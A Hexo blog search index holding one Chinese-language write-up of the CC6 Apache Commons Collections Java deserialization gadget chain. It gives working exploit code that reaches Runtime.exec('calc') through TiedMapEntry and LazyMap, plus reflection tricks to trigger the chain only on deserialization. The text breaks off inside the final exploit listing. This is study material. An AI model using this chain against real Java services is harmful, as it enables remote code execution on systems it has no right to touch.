<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CC6</title>
    <link href="/2025/11/25/CC6/"/>
    <url>/2025/11/25/CC6/</url>
    
    <content type="html"><![CDATA[<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>jdk8u71之后，AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了</p><p>也就是导致<br><del>AnnotationInvocationHandler.readObject</del><br><del>AnnotationInvocationHandler.invoke.memberValues.get</del><br>不能用了</p><p>cc6和cc1类似，但是cc6不受jdk版本影响<br>所以现在的目的就是要找一个替代</p><p>后面LazyMap.get.ChainedTransformer.transform与CC1一样<br>走的是HashMap.readObjexct———-&gt;TiedMapEntry.hashCode————-&gt;LazyMap,get()</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul><li><p>上面提到的流程和cc1有相同的地方，先把代码写出来</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC6Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        map.put(&quot;value&quot;, &quot;12&quot;);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">lazyMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">//构造        </span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ul><blockquote><p>主要是TiedMapEntry.hashCode调用了get</p></blockquote><ul><li><p>进到TiedMapEntry看看</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125143233854.png" alt="image-20251125143226742"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125143235493.png" alt="image-20251125143235470"></p><p>hashCode调用了getValue，而getValue方法返回的是<strong>get（）</strong></p></li><li><p>看TiedMapEntry的构造</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> key) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">map</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">key</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>根据构造写测试链</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">TiedMapEntry</span><span style="color: #E06C75"> tiedMapEntry </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #E06C75">(lazyMap</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> map2</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">map2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(tiedMapEntry, </span><span style="color: #98C379">&quot;bbb&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//不能直接序列化反序列化，需要先构造一个TiedMapEntry</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//因为这里有put，（前面的urlDNS链说过这个问题）</span></span><span class="line"><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(map2)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//仅仅测试</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125144106497.png" alt="image-20251125144106395"></p><p>发现序列化的时候就弹出（正常是反序列化的时候弹）</p></li><li><p>按照URLDNS的思路修改上面的代码</p><p>目前来看是：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">tiedMapEntry-------lazyMap---------chainedTransformer--------transformers</span></span></code></pre></div></div></figure><p>put只要不触发，所以改这四个哪一个都行（利用反射改值）</p><p>eg：（改chainedTransformer）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> factoryFiled </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;factory&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">factoryFiled</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">factoryFiled</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(lazyMap,chainedTransformer);</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251125145120263.png" alt="image-20251125145120192"></p><p>也就是说先给<strong>put</strong>一个正常的Transformer（ConstantTransformer）</p><p><code>ConstantTransformer(1).transform() 不会执行命令，只会返回 1</code></p><p>后面<strong>序列化的时候</strong>改值   将 <code>lazyMap</code> 对象中的 <code>factory</code> 字段的值，替换为<code>chainedTransformer</code> 对象</p></li><li><p><strong>但是序列化不执行，反序列化也没执行？？？？</strong></p><p>由于put的时候已经将hashcode消耗掉了</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">LazyMap.get(&quot;aaa&quot;)：</span></span><span class="line"><span style="color: #abb2bf">    如果 map 里没有 key &quot;aaa&quot;：</span></span><span class="line"><span style="color: #abb2bf">         调用 factory.transform(&quot;aaa&quot;)</span></span><span class="line"><span style="color: #abb2bf">         并把结果 put 进去</span></span><span class="line"><span style="color: #abb2bf">         </span></span><span class="line"><span style="color: #abb2bf">如果 lazyMap 中 “aaa” 已经存在，则：</span></span><span class="line"><span style="color: #abb2bf">再次访问时 不会 调用 transformer（不会触发链）</span></span><span class="line"><span style="color: #abb2bf">如果 lazyMap 中 “aaa” 不存在，则：</span></span><span class="line"><span style="color: #abb2bf">再次访问时 必须 调用 transformer（触发链）</span></span></code></pre></div></div></figure><p>put的时候，在hashcode里面已经存在了一个key（aaa），在反序列化的时候还是那个key（aaa）</p><p>所以现在就要在put之后把key删除</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">lazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;aaa&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li></ul><h3 id="漏洞构造"><a href="#漏洞构造" class="headerlink" title="漏洞构造"></a>漏洞构造</h3><p>结合上面所说构造exp</p><h4 id="删除ChainedTransformer的exp"><a href="#删除ChainedTransformer的exp" class="headerlink" title="删除ChainedTransformer的exp"></a>删除ChainedTransformer的exp</h4><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.Transformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.ChainedTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.ConstantTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.InvokerTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.map.LazyMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.map.TransformedMap</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.*</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.InvocationTargetException</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC6Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: 